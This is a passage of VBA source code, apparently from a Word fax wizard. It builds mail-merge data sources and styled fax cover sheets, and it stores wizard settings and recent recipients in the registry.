    Selection.HomeKey wdStory
    
    With ActiveDocument.Content
        .SpellingChecked = True
        .GrammarChecked = True
    End With
    
    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'creates a data source for the cover sheet in the temp. directory
Private Sub CreateDataSource()
Dim objRng As Range
Dim strPath As String
Dim objDataSrcDoc As Document, objMM As MailMerge
Dim strDataSrcName As String
    On Error GoTo FatalError
    
    Set objMM = ActiveDocument.MailMerge
    objMM.MainDocumentType = wdFormLetters
    
    If (fDocIsFormLtr) Then
        objMM.OpenDataSource objDataSrc.Name, Connection:=strConnectString
        objMM.DataSource.QueryString = strFormLetterSQL & strFormLetterSQL1
        Exit Sub
    End If
    
    Set objDataSrcDoc = Application.Documents.Add
    
    Set objRng = objDataSrcDoc.Content
    
    CreateTableFromFaxInfo objRng
    
    strPath = Options.DefaultFilePath(wdTempFilePath)
    If Right$(strPath, 1) <> strPathSeparator Then _
        strPath = strPath & strPathSeparator
        
    strDataSrcName = strPath & "~$CovSht@" & Format$(Date, "dd-mm-yy") & "," & Format$(Time, "hh-mm-ss") & ".tmp"
    objDataSrcDoc.SaveAs strDataSrcName, wdFormatDocument
    objDataSrcDoc.Close wdDoNotSaveChanges
    
    'attach the data source doc. to activedocument (cover sheet)
    objMM.OpenDataSource strDataSrcName
    
    Exit Sub
FatalError:
    ReportError Err
End Sub


'creates a table in the data source document with names and numbers
'the format of the table is just like how one would create a data source doc.
'through Word
Private Sub CreateTableFromFaxInfo(objRange As Range)
Dim strText As String
Dim i As Integer

    On Error GoTo FatalError

    strText = strFLD_FAX_NAME & vbCr & strFLD_FAX_NUMBER
    
    'collect the names and numbers entered by the user
    For i = 1 To iNumRcpnts
        strText = strText & vbCr & rgstrRcpntFaxNames(i - 1) & vbCr & rgstrRcpntFaxNums(i - 1)
    Next i

    objRange.InsertBefore strText
    'Add a table with 2 columns and iNumRcpnts+1 rows
    objRange.Select
    Selection.ConvertToTable vbCr, iNumRcpnts + 1, 2
    
    Exit Sub
FatalError:
    ActiveDocument.Close wdDoNotSaveChanges 'close the data source doc.
    ReportError Err
End Sub

Public Function FCopyStyles(iStyle As Integer) As Boolean
    Dim strStyleName As String
    Dim strLongName As String
    Dim i As Integer
    
    On Error GoTo TemplateNotFound
LFindTemplate:
    ' Attempt to locate longname, then shortname template file
    i = iLONG_NAME
    strStyleName = strTemplatePath & rgstrTemplateFileNames(iStyle, iLONG_NAME)
    strLongName = strStyleName
    If Dir(strStyleName) <> "" Then GoTo LApplyStyles
LTryShortName:
    i = iSHORT_NAME
    strStyleName = strTemplatePath & rgstrTemplateFileNames(iStyle, iSHORT_NAME)

LApplyStyles:
    StatusBar = strAPPLYING
    
    ' Get styles
    ActiveDocument.CopyStylesFromTemplate (strStyleName)
    
    ' No Error
    fStylesCopied = True
    StatusBar = ""
    FCopyStyles = True
    Exit Function
    
TemplateNotFound:
    If i = iLONG_NAME Then
        i = iSHORT_NAME
        Err.Clear
        GoTo LTryShortName
    End If
    DisplayErrorMsg strERR_STYLE_NOT_FOUND & strLongName & strERR_STYLE_NOT_FOUND2
    fStylesCopied = False
    StatusBar = ""
    FCopyStyles = False
End Function

'creates professional/Contemporary style cover sheet
Private Sub CreateProfContCoverSheet()
Dim objRngBuffer1 As Range
Dim objRngBuffer2 As Range
Dim strCmpnyName As String, strName As String
Dim strMFFirstName As String, strMFLastName As String, strMFFaxNum As String
Dim objRngTextTable As Range
Dim objTable As Table

    On Error GoTo FatalError
    
    If iFaxStyle = iSTY_CONTEMPORARY Then
        InsertContAutoText
        objActiveRange.Collapse wdCollapseEnd
    End If
    
    InsertReturnAddress
    GetMergeFieldNames strMFFirstName, strMFLastName, strMFFaxNum
    
    'Insert company name
    strCmpnyName = formWizard.txtCompany.Text
    If (iFaxStyle = iSTY_PROFESSIONAL) Then
        If (Len(strCmpnyName)) Then
            objActiveRange.Style = strSTY_COMPANY_NAME
            objActiveRange.InsertBefore strCmpnyName & vbCr
            objActiveRange.Collapse wdCollapseEnd
        End If
        'Insert title
        objActiveRange.Style = strSTY_DOC_LABEL
        objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) & vbCr
        objActiveRange.Collapse wdCollapseEnd
    End If
    

    
    Set objRngTextTable = objActiveRange.Duplicate
    
'the topics To: and From: have a character style which has to be
'applied after the data has been written (since the data have a
'different style). so, use a range buffer
    
    '1st line text has style "Message Header First". The subsequent
    'lines have "Message Header"
    
    'Insert To:
    objActiveRange.Style = strSTY_MSG_HDR_FIRST
    objActiveRange.InsertBefore strTO
    Set objRngBuffer1 = objActiveRange.Duplicate

    'insert recipient name
    If (iNumRcpnts = 1) And (Not (fDocIsFormLtr)) Then
        objActiveRange.InsertAfter vbTab & rgstrRcpntFaxNames(0) & vbTab
    Else
        'insert appropriate field
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        If ((iNumRcpnts > 1) Or (fDocIsFormLtr)) Then
            InsertField objActiveRange, wdFieldMergeField, strMFFirstName, True
            If Len(strMFLastName) Then
                objActiveRange.InsertAfter strSPACE
                objActiveRange.Collapse wdCollapseEnd
                InsertField objActiveRange, wdFieldMergeField, strMFLastName, True
            End If
        Else
            InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        End If
        objActiveRange.InsertAfter vbTab
    End If
    
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert From:
    objActiveRange.InsertBefore strFROM
    Set objRngBuffer2 = objActiveRange.Duplicate
    
    'insert sender's name
    strName = formWizard.txtSenderName.Text
    If Len(strName) Then
        objActiveRange.InsertAfter vbTab & strName & vbCr
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        'insert macrobutton field.
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        objActiveRange.InsertParagraphAfter
    End If
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'next 3 lines in "Message Header" style
    'Insert Fax Number
    objActiveRange.Style = wdStyleMessageHeader
    
    objActiveRange.InsertBefore strFAX
    Set objRngBuffer1 = objActiveRange.Duplicate

    If (iNumRcpnts = 1) And (Not (fDocIsFormLtr)) Then
        objActiveRange.InsertAfter vbTab & rgstrRcpntFaxNums(0) & vbTab
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        'insert the appropriate field
        If ((iNumRcpnts > 1) Or (fDocIsFormLtr)) Then
            InsertField objActiveRange, wdFieldMergeField, strMFFaxNum, True
        Else
            InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_FAX_NUMBER, False
        End If
        objActiveRange.InsertAfter vbTab
    End If
    
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert Date
    objActiveRange.InsertBefore strDATE
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    'insert datefield
    InsertField objActiveRange, wdFieldTime, "\@ " & strQUOTE & strDATE_FORMAT & strQUOTE, True

    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    
    'Next line
    'Insert Phone
    objActiveRange.InsertBefore strPHONE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PHONE_NUMBER, False
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert Pages:
    objActiveRange.InsertBefore strPAGES
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PAGES, False
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'Insert Re:
    objActiveRange.InsertBefore strRE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_SUBJECT, False
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert CC:
    objActiveRange.InsertBefore strCC
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False

    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'convert the text into a table
    objRngTextTable.End = objActiveRange.End
    objRngTextTable.Select
    Set objTable = Selection.ConvertToTable(vbTab, 4, 4, AutoFit:=True, Format:=0)
    With objTable
        .Borders.Enable = False
        .Rows.SpaceBetweenColumns = 0
        If iFaxStyle = iSTY_CONTEMPORARY Then
            .Rows.LeftIndent = sCONT_LEFT_INDENT
        Else 'for professional style.
        'contemporary has autotext entry to insert the lines.
            Selection.Cells.AutoFit
            .Columns(2).Width = sCONT_WIDTH_COL1
            .Columns(4).Width = sCONT_WIDTH_COL1
            .Rows.Borders(wdBorderHorizontal).Visible = True
            .Borders(wdBorderBottom).Visible = True
        End If
    End With
    'convert to table inserts a vbCr after the table.
    InsertCheckBoxes
    InsertBodyText
    
    If iFaxStyle = iSTY_CONTEMPORARY Then
        Set objActiveRange = ActiveDocument.Content
        objActiveRange.Collapse wdCollapseStart
        'Insert title
        objActiveRange.Style = strSTY_DOC_LABEL
        objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) ' & vbCr
    '    objActiveRange.Collapse wdCollapseEnd
    End If
    Exit Sub
FatalError:
    ReportError Err
End Sub
'creates an elegant style cover sheet
Private Sub CreateElegCoverSheet()
Dim objRngBuffer1 As Range
Dim objRngBuffer2 As Range
Dim strCmpnyName As String, strName As String
Dim strMFFirstName As String, strMFLastName As String, strMFFaxNum As String
Dim objRngTextTable As Range
Dim objTable As Table, objRow As Row
Dim i As Integer

    On Error GoTo FatalError
    
    InsertReturnAddress
    
    GetMergeFieldNames strMFFirstName, strMFLastName, strMFFaxNum
    
    'Insert company name
    strCmpnyName = formWizard.txtCompany.Text
    If (Len(strCmpnyName)) Then
        objActiveRange.Style = strSTY_COMPANY_NAME
        objActiveRange.InsertBefore strCmpnyName & vbCr
        objActiveRange.Collapse wdCollapseEnd
    End If
    
    'Insert title
    objActiveRange.Style = strSTY_DOC_LABEL
    objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) & vbCr
    objActiveRange.Collapse wdCollapseEnd
    
    Set objRngTextTable = objActiveRange.Duplicate
        
'the topics To: and From: have a character style which has to be
'applied after the data has been written (since the data have a
'different style). so, use a range buffer
    
    '1st line text has style "Message Header First". The subsequent
    'lines have "Message Header"
    
    'Insert To: & From:
    objActiveRange.Style = strSTY_MSG_HDR_FIRST
    
    objActiveRange.InsertBefore strTO & vbTab & strFROM
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert textual information in the next line
    If (iNumRcpnts > 1) Or fDocIsFormLtr Then
        InsertField objActiveRange, wdFieldMergeField, strMFFirstName, True 'Preserveformatting
        If Len(strMFLastName) Then
            objActiveRange.InsertAfter strSPACE
            objActiveRange.Collapse wdCollapseEnd
            InsertField objActiveRange, wdFieldMergeField, strMFLastName, True
        End If
    ElseIf iNumRcpnts = 1 Then
        objActiveRange.InsertBefore rgstrRcpntFaxNames(0)
    Else
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
    End If
    
    'insert name
    strName = formWizard.txtSenderName.Text
    If Len(strName) Then
        objActiveRange.InsertAfter vbTab & strName & vbCr
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        objActiveRange.InsertParagraphAfter
    End If

    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL

    'next 3 lines in "Message Header" style
    'Insert FaxNumber and Date
    objActiveRange.Style = wdStyleMessageHeader
    
    objActiveRange.InsertBefore strFAX_NUMBER & vbTab & strDATE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert textual information in the next line
    
    'insert recipient number
    If (iNumRcpnts > 1) Or fDocIsFormLtr Then
        InsertField objActiveRange, wdFieldMergeField, strMFFaxNum, True 'Preserveformatting
    ElseIf iNumRcpnts = 1 Then
        objActiveRange.InsertBefore rgstrRcpntFaxNums(0)
    Else
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_FAX_NUMBER, False
    End If
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'insert datefield
    InsertField objActiveRange, wdFieldTime, "\@ " & strQUOTE & strDATE_FORMAT & strQUOTE, True
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'Insert CompanyName & Pages
    objActiveRange.InsertBefore strCOMPANY & vbTab & strTOTAL_NO_PAGES
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert company name
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_COMPANY, False 'PreserveFormatting
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PAGES, False 'PreserveFormatting
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd

    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'Phone Number & Re:
    objActiveRange.InsertBefore strPHONE_NUMBER & vbTab & strRE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PHONE_NUMBER, False 'PreserveFormatting
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_SUBJECT, False 'PreserveFormatting
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd

    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'convert the text into a table
    objRngTextTable.End = objActiveRange.End '- 1 'don't want the last CR
    objRngTextTable.Select
    Set objTable = Selection.ConvertToTable(vbTab, 10, 2, Format:=0)
    objTable.Borders.Enable = False
    
    For i = 2 To 8 Step 2
        Set objRow = objTable.Rows(i)
        objRow.Range.ParagraphFormat.LeftIndent = 0.25 * 72
        'don't need the bottom border for the last row.
        If i <> 8 Then objRow.Borders(wdBorderBottom) = True
    Next i
    
    InsertCheckBoxes
    InsertBodyText
    
    Exit Sub
FatalError:
    ReportError Err
End Sub

'Get the names of the merge fields to be inserted in the cover sheet
'If the original doc. is a form letter then we need to insert the merge fields
'selected by the user. If not then insert the merge field names we created in the
'data source we created
Private Sub GetMergeFieldNames(strFirstName As String, strLastName As String, strFaxNum As String)
    On Error GoTo FatalError
    
    If (fDocIsFormLtr) Then
        'user selects names from drop-down of all possible mergefields in data source
        strFirstName = formWizard.cboFldsRcpntFirstName.Text
        strLastName = formWizard.cboFldsRcpntLastName.Text
        If (strLastName = strNONE) Then strLastName = ""
        strFaxNum = formWizard.cboFldsFaxNum.Text
    Else
       strFirstName = strFLD_FAX_NAME
       strLastName = ""
       strFaxNum = strFLD_FAX_NUMBER
    End If
    
    Exit Sub
FatalError:
    ReportError Err
End Sub
Private Sub InsertReturnAddress()
Dim strFromPh As String
Dim strFromFax As String
Dim strText As String, strAddress As String

    On Error GoTo FatalError
    
    'Set objActiveRange = ActiveDocument.Content
    'If iFaxStyle = iSTY_CONTEMPORARY Then objActiveRange.Collapse wdCollapseEnd

    strFromPh = formWizard.txtSenderPhone.Text
    strFromFax = formWizard.txtSenderFax.Text
    strAddress = formWizard.txtMailingAddr.Text

    Select Case iFaxStyle
    
    Case iSTY_CONTEMPORARY, iSTY_PROFESSIONAL
        strText = strAddress
        If Len(strText) Then strText = strText & vbCr
        If Len(strFromPh) <> 0 Then _
            strText = strText & strPHONE & strSPACE & strFromPh & vbCr

        If Len(strFromFax) <> 0 Then _
            strText = strText & strFAX & strSPACE & strFromFax & vbCr
        If Len(strText) = 0 Then strText = strText & vbCr
    Case iSTY_ELEGANT
        strText = StrReplaceCrLfWithText(strAddress, strSPACE & strBULLET & strSPACE)
        If Len(strText) Then strText = strText & vbCr
        'if you have phone number
        If Len(strFromPh) <> 0 Then
            strText = strText & strPHONE & strSPACE & strFromPh
            'check if you also have fax
            'instead of vbCr use space, bullet, space combination
            If Len(strFromFax) <> 0 Then _
                strText = strText & strSPACE & strBULLET & strSPACE & strFAX & strSPACE & strFromFax
            strText = strText & vbCr
        'check if you have only Fax
        ElseIf Len(strFromFax) <> 0 Then
            strText = strText & strFAX & strSPACE & strFromFax & vbCr
        End If
        
    End Select
    
    objActiveRange.Style = strSTY_RETURN_ADDR
    objActiveRange.InsertBefore strText
    objActiveRange.Collapse wdCollapseEnd
    Exit Sub
    
FatalError:
    ReportError Err
End Sub
'Inserts the check-boxes and the text associated with them
Private Sub InsertCheckBoxes()
Dim i As Integer
Dim R1 As Range
    On Error GoTo FatalError
    objActiveRange.Style = strSTY_MSG_HDR_LAST
    objActiveRange.Collapse wdCollapseEnd
    Set R1 = objActiveRange.Duplicate

    Set R1 = objWizTemplate.AutoTextEntries(strAT_UNCHKD_BOX).Insert(R1)

    objActiveRange.End = R1.End + 1
    objActiveRange.Start = R1.End + 1
    objActiveRange.InsertAfter strSPACE + rgstrChkBoxText(1) + vbTab
    objActiveRange.Style = wdStyleEmphasis

    objActiveRange.Collapse wdCollapseEnd
    For i = 2 To 5
        objActiveRange.FormattedText = R1.FormattedText
        objActiveRange.Collapse wdCollapseEnd
        objActiveRange.InsertAfter strSPACE + rgstrChkBoxText(i) + vbTab
        objActiveRange.Style = wdStyleEmphasis
        objActiveRange.Collapse wdCollapseEnd
    Next i

    'delete the previous character i.e the last tab
    objActiveRange.Start = objActiveRange.End - 1
    objActiveRange.Delete
    objActiveRange.InsertParagraph
    objActiveRange.Collapse wdCollapseEnd
    Exit Sub
    
FatalError:
    ReportError Err
End Sub

Private Sub InsertBodyText()
Dim R1 As Range
Dim strAfterText As String
    On Error GoTo FatalError
    
    If iFaxStyle = iSTY_ELEGANT Then
        strAfterText = vbCr
    Else
        strAfterText = strSPACE & strSPACE
    End If

    
    If iFaxStyle = iSTY_PROFESSIONAL Then _
        objActiveRange.InsertAfter strBULLET

    objActiveRange.InsertAfter rgstrNotes(iFaxStyle) & strAfterText
    
    Set R1 = objActiveRange.Duplicate
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_COMMENTS, False 'PreserveFormatting
    objActiveRange.Style = wdStyleBodyText
    R1.Style = strSTY_MSG_HDR_LABEL
    
    Exit Sub
FatalError:
    ReportError Err
End Sub
Private Sub InsertContAutoText()

    On Error GoTo FatalError
    Set objActiveRange = objWizTemplate.AutoTextEntries(strCNTMPGFX2).Insert(objActiveRange, True)
   
    Exit Sub
FatalError:
    DisplayErrorMsg strERR_AUTOTEXT_NOT_FOUND
End Sub


Public Sub RestoreDialogValues(fDummy As Boolean)
    Dim fAddrBkEnable As Boolean
    Dim i As Integer
    Dim strChkdAddr As String
    
    On Error GoTo FatalError
    StatusBar = strRST_SETTINGS
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
   
    fAddrBkEnable = Application.MAPIAvailable
    formWizard.cmdRcpntsAddrBk.Enabled = fAddrBkEnable
    formWizard.cmdSenderAddrBk.Enabled = fAddrBkEnable
    
'Setting options in Panel1 depending on whether a doc. is present or not
    If fDocPresent Then
        formWizard.optCurDoc.Value = True
        formWizard.optCurDocCovShtYes.Value = True
    Else
        'disable a bunch of options
        formWizard.optCurDoc.Enabled = False
        formWizard.cboDocList.Enabled = False
        formWizard.optCurDocCovShtNo.Enabled = False
        formWizard.optCurDocCovShtYes.Enabled = False
        formWizard.optCovSht.Value = True
        formWizard.frmRcpntsFormDoc.Visible = False
        formWizard.frmRcpntsOrdDoc.Visible = True
    
    End If

    'Panel2
    'read values from registry.
    iFaxOption = IRestorePref("Fax Option", 0)
    If InStr(UCase$(System.OperatingSystem), "NT") Then
        fMSFAXEnabled = False
        formWizard.optMSFax.Enabled = False
    Else
        fMSFAXEnabled = True
    End If
    'set printer in combo-box before disabling frmFaxDriver.
    GetAllPrinters
        
    'the controls are assumed to be enabled initially and are explicityly
    'only turned off, never turned on.
    If (iFaxOption = iMS_FAX) And Not (fMSFAXEnabled) Then
        If iTotalNumPrinters > 0 Then
            iFaxOption = iDIFF_FAX
        Else
            iFaxOption = iNO_FAX
        End If
    End If
    Select Case iFaxOption
        Case iMS_FAX:
            formWizard.optMSFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
        Case iDIFF_FAX:
            formWizard.optDifferentFax.Value = True
        Case iNO_FAX:
            formWizard.optNoFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
        Case Else
            iFaxOption = iNO_FAX
            formWizard.optNoFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
            
    End Select
    
    'Panel3
    fRegistryNamesRead = False
    
    'Panel5
    formWizard.txtSenderName.Text = Application.UserName

    i = ICountLines(Application.UserAddress, strChkdAddr, iMAX_ADDR_LINES)
    formWizard.txtMailingAddr.Text = strChkdAddr
    formWizard.txtSenderFax.Text = StrRestorePref("Sender Fax", "")
    formWizard.txtSenderPhone.Text = StrRestorePref("Sender Phone", "")
    
    'Panel 4
    iFaxStyle = IRestorePref("Coversheet Style", 0)
    If (iFaxStyle < iSTY_PROFESSIONAL) Or (iFaxStyle > iSTY_ELEGANT) Then _
        iFaxStyle = iSTY_PROFESSIONAL
    Select Case iFaxStyle
        Case iSTY_PROFESSIONAL
            formWizard.optStyleProf.Value = True
            formWizard.lblStyle0.Visible = True
        Case iSTY_CONTEMPORARY
            formWizard.optStyleCont.Value = True
            formWizard.lblStyle1.Visible = True
        Case iSTY_ELEGANT
            formWizard.optStyleEleg.Value = True
            formWizard.lblStyle2.Visible = True
    End Select
    
    On Error GoTo -1 'reset error trap
    On Error Resume Next
    formWizard.txtCompany.Text = System.PrivateProfileString("", strREGKEY_CMPNY_NAME, strVALKEY_CMPNY_NAME)
    fSettingsRestored = True
    System.Cursor = wdCursorNormal
    StatusBar = ""
    Application.ScreenUpdating = True

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'sets default merge fields
Public Sub FillMergeFields(fDummy As Boolean)
Dim i As Integer, iCount As Integer
Dim iFirstName As Integer
Dim iLastName As Integer
Dim iFax As Integer
Dim rgstrNames() As String
Dim objFieldNames As MailMergeFieldNames
Dim objTempDoc As Document

    On Error GoTo FatalError
    iFirstName = -1
    iLastName = -1
    iFax = -1
    
    'reset the query options so that all names in the data src are selected
    
    Set objFieldNames = objDataSrc.FieldNames
    iCount = objFieldNames.Count
    ReDim rgstrNames(iCount - 1)
    For i = 1 To iCount
        rgstrNames(i - 1) = objFieldNames(i).Name
        If InStr(rgstrNames(i - 1), strFLD_NAME) Then
            If iFirstName = -1 Then
                iFirstName = i - 1
            ElseIf iLastName = -1 Then
                iLastName = i - 1
            End If
        ElseIf InStr(rgstrNames(i - 1), strFLD_FAX) Then
            If iFax = -1 Then iFax = i - 1
        End If
        
    Next i
    
    formWizard.cboFldsRcpntFirstName.List = rgstrNames
    formWizard.cboFldsRcpntLastName.List = rgstrNames
    formWizard.cboFldsFaxNum.List = rgstrNames
    
    formWizard.cboFldsRcpntFirstName.AddItem strNONE
    formWizard.cboFldsRcpntLastName.AddItem strNONE
    
    If (iFirstName <> -1) Then
        formWizard.cboFldsRcpntFirstName.Value = rgstrNames(iFirstName)
    Else
        formWizard.cboFldsRcpntFirstName.Value = strNONE
    End If
        
    If (iLastName <> -1) Then
        formWizard.cboFldsRcpntLastName.Value = rgstrNames(iLastName)
    Else
        formWizard.cboFldsRcpntLastName.Value = strNONE
    End If
        
    If (iFax <> -1) Then _
        formWizard.cboFldsFaxNum.Value = rgstrNames(iFax)

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'retrieves the Names and numbers stored in registry.
Sub ReadRegistryFaxNames(fDummy As Boolean)
Dim j As Integer, K As Integer
Dim objCtrls As Object
    On Error GoTo FatalError
    fRegistryNamesRead = True
    Set objCtrls = formWizard.mpgWizardPage.Pages(iPANEL_RCPNTS).Controls
    
    For j = 1 To iMAX_RCPNTS
        rgstrMRUFaxNames(j - 1) = StrRestorePref(strRCPNT_NAME & j, "")
        rgstrMRUFaxNums(j - 1) = StrRestorePref(strRCPNT_NUMBER & j, "")
    Next j
        
    
    For j = 0 To iMAX_RCPNTS - 1
        objCtrls(strCBO_RCPNT_NAME & j).List = rgstrMRUFaxNames
        objCtrls(strCBO_RCPNT_NUM & j).List = rgstrMRUFaxNums
    Next j
    
    Exit Sub
    
FatalError:
    ReportError Err
End Sub
Sub SaveDialogValues(fDummy As Boolean)
    On Error GoTo FatalError
    
    StatusBar = strSAVE_SETTINGS
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    System.PrivateProfileString("", strREG_SETTINGS_BASE_KEY, strREG_ASSISTANT_TIME_STAMP) = Format$(Now, "General Date")
    StoreValPref strREG_ASSISTANT_HELP, iLocalState
    
    StorePref "Fax Option", CStr(iFaxOption)
    If iFaxOption = iDIFF_FAX Then _
        StorePref "Fax Driver", formWizard.cboFaxDriver.Text
    
    StorePref "Sender Fax", formWizard.txtSenderFax.Text
    StorePref "Sender Phone", formWizard.txtSenderPhone.Text
    StorePref "Coversheet Style", CStr(iFaxStyle)
    
    If Not (fDocIsFormLtr) Then SaveRcpntsInRegistry
    
    fSettingsSaved = True
    System.Cursor = wdCursorNormal
    StatusBar = ""
    Application.ScreenUpdating = True

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'stores the recipient names and numbers of iMAX_RCPNTS recipients.
'The name is tagged to the number. So, you can have a number without a name
'but not a name without a number
Private Sub SaveRcpntsInRegistry()
'Dim strName As String
Dim strNum As String
Dim i As Integer, j As Integer, K As Integer
Dim objCtrls As Object

    On Error GoTo FatalError
    K = 0
    'initialize the arrays so that even if the user has not
    'chosen any recipient we can still use the first entry of the arrays.
    rgstrRcpntFaxNames(0) = ""
    rgstrRcpntFaxNums(0) = ""
    iNumRcpnts = 0
    
    Set objCtrls = formWizard.mpgWizardPage.Pages(iPANEL_RCPNTS).Controls
    
    For i = 0 To iMAX_RCPNTS - 1
        strNum = StrSearchReplace(objCtrls(strCBO_RCPNT_NUM & i).Text, vbTab, " ") 'recipient number
        If (Len(strNum)) Then 'if number not empty
            rgstrRcpntFaxNums(K) = strNum 'store number
            rgstrRcpntFaxNames(K) = StrSearchReplace(objCtrls(strCBO_RCPNT_NAME & i).Text, vbTab, " ") 'and corresponding name
            K = K + 1
            StorePref strRCPNT_NUMBER & K, strNum 'store number
            StorePref strRCPNT_NAME & K, rgstrRcpntFaxNames(K - 1)
 
            j = objCtrls(strCBO_RCPNT_NUM & i).ListIndex
            
            'user selected one of the choices
            If j <> -1 Then rgstrMRUFaxNums(j) = ""  'already picked up this text
        End If
    Next i
    
    iNumRcpnts = K
    
    j = 0
    While (K < iMAX_RCPNTS) 'if we haven't yet iMAX_RCPNTS names
        'go through the array of orginally obtained recipients and
        'store which haven't yet been stored
        While ((j < iMAX_RCPNTS) And (Len(rgstrMRUFaxNums(j)) = 0))
            j = j + 1
        Wend
        
        If j = iMAX_RCPNTS Then
            GoTo LReturn 'no names left to fill
        Else
            K = K + 1
            StorePref strRCPNT_NAME & K, rgstrMRUFaxNames(j) 'store name
            StorePref strRCPNT_NUMBER & K, rgstrMRUFaxNums(j) 'and corresponding number
            rgstrMRUFaxNums(j) = ""
        End If
    Wend

LReturn:
    Exit Sub
FatalError:
    ReportError Err
End Sub

'Error will be taken care of in SetupDocForFax
'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub SaveRcpntsInDocVars(fSaveRcpnts As Boolean)
Dim i As Integer
Dim objVars As Variables
